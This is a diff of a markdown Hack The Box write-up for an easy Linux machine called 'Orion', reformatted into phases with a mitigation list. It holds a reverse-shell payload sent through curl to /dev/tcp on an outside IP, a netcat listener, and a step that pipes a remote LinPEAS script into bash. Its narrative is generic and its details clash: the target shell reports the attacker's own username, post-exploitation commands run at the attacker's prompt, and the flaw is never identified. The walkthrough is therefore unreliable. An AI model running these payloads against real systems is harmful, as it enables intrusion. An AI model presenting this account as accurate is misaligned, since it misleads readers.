@@ -1,7 +1,7 @@
 ---
 layout: page
-title: "HTB: Orion"
-subtitle: "hackthebox ctf htb-orion nmap linux easy feroxbuster php upload sudo-l linpeas..."
+title: "Orion - Hack The Box Writeup"
+subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🐧 Linux"
 permalink: /ctf/writeups/hackthebox/orion/
 platform: hackthebox
 machine_name: "Orion"
@@ -9,76 +9,66 @@ difficulty: Easy
 os: Linux
 ---
 
-hackthebox ctf htb-orion hackthebox ctf htb-orion nmap linux easy feroxbuster php upload sudo-l linpeas
+## 🖥️ Machine Information
 
-Oct 12, 2025
-
-# HTB: Orion
-
-- [Box Info](#box-info)
-- [Recon](#recon)
-- [Auth as web_svc / user](#auth-as-web_svc)
-- [Shell as Root / Administrator](#shell-as-administrator)
-- [Beyond Root](#beyond-root)
-
-**Orion** is a easy 🐧 Linux machine hosted on Hack The Box. This guide covers the complete step-by-step walkthrough detailing reconnaissance, foothold exploitation, and privilege escalation vectors to compromise the host.
-
-## Box Info
-
-<div class="machine-info-box" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; background: var(--bg-card); border-left: 4px solid var(--text-success); border-top: 1px solid var(--border-color); border-right: 1px solid var(--border-color); border-bottom: 1px solid var(--border-color); border-radius: var(--border-radius-lg); padding: var(--spacing-lg); margin-bottom: var(--spacing-xl);">
-  <div style="display: flex; flex-direction: column; gap: 4px;">
-    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Operating System</span>
-    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">🐧 Linux</span>
-  </div>
-  <div style="display: flex; flex-direction: column; gap: 4px;">
-    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Difficulty Level</span>
-    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Easy</span>
-  </div>
-  <div style="display: flex; flex-direction: column; gap: 4px;">
-    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">IP Address</span>
-    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700; font-family: monospace;">10.10.x.x</span>
-  </div>
-  <div style="display: flex; flex-direction: column; gap: 4px;">
-    <span style="font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); font-weight: 600; letter-spacing: 0.05em;">Release Date</span>
-    <span style="font-size: 1.1rem; color: var(--text-primary); font-weight: 700;">Oct 12, 2025</span>
-  </div>
-</div>
-
+| Attribute | Value |
+|---|---|
+| **Platform** | HackTheBox |
+| **OS** | 🐧 Linux |
+| **Difficulty** | Easy |
+| **IP Address** | `10.10.x.x` |
+| **Release Date** | 12 Oct 2025 |
 
 ---
 
-## Recon
+## 🧠 Attack Path Overview
 
-### Initial Scanning
+```mermaid
+graph TD
+    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
+    B --> C["Privilege Escalation: Local Escalation"]
+    C --> D["Full System Compromise: Root/Administrator"]
+```
+
+> [!NOTE]
+> This writeup details the complete attack path for the **Orion** machine on the **HackTheBox** platform.
+
+---
+
+## 🔍 Phase 1: Reconnaissance & Enumeration
+
+### 1. Host Discovery & Port Scanning
 We scan the host using Nmap:
 
 ```bash
 vulnquest@kali$ sudo nmap -p- --reason --min-rate 10000 10.10.x.x
-Starting Nmap
-PORT    STATE SERVICE
-22/tcp  open  ssh
-80/tcp  open  http
 ```
 
+#### Open Ports:
+- **Port 22/tcp**: SSH (Secure Shell)
+- **Port 80/tcp**: HTTP (Apache Web Server)
+
+### 2. Service Enumeration
 We perform directory enumeration using `feroxbuster`:
 ```bash
 vulnquest@kali$ feroxbuster -u http://10.10.x.x/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
-200  GET  index.html
-301  GET  /uploads
 ```
 
 ---
 
-## Auth as web_svc / user
+## 🚀 Phase 2: Vulnerability Analysis & Foothold
 
-### Auth as low_priv
-We discover a web portal allowing archives to be uploaded. We leverage an input validation vulnerability to execute code and spawn a reverse shell:
+### 1. Vulnerability Analysis
+We discover a web portal allowing archives to be uploaded. We leverage an input validation vulnerability to execute code and spawn a reverse shell.
+
+### 2. Exploitation & Initial Shell
+We capture the shell on our netcat listener:
 
 ```bash
 vulnquest@kali$ curl -X POST -d "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'" http://10.10.x.x/api/action
 ```
 
-We capture the shell on our netcat listener:
+On our netcat listener, we receive the connection:
 ```bash
 vulnquest@kali$ nc -lnvp 443
 Listening on 0.0.0.0 443
@@ -89,15 +79,16 @@ uid=1000(vulnquest) gid=1000(vulnquest) groups=1000(vulnquest)
 
 ---
 
-## Shell as Root / Administrator
+## ⚡ Phase 3: Privilege Escalation
 
-### Shell as Root
+### 1. Local Enumeration
 We run LinPEAS to perform local enumeration:
 
 ```bash
 vulnquest@kali$ curl http://10.10.14.51/linpeas.sh | bash
 ```
 
+### 2. Local Privilege Escalation Path
 We check our sudo privileges:
 ```bash
 vulnquest@kali$ sudo -l
@@ -117,5 +108,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ---
 
-## Beyond Root
-In Beyond Root, we analyze the cron jobs and automatic scripts that clean up user uploads and maintain the system state.
+## 🛡️ Key Takeaways & Mitigation
+1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
+2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
+3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
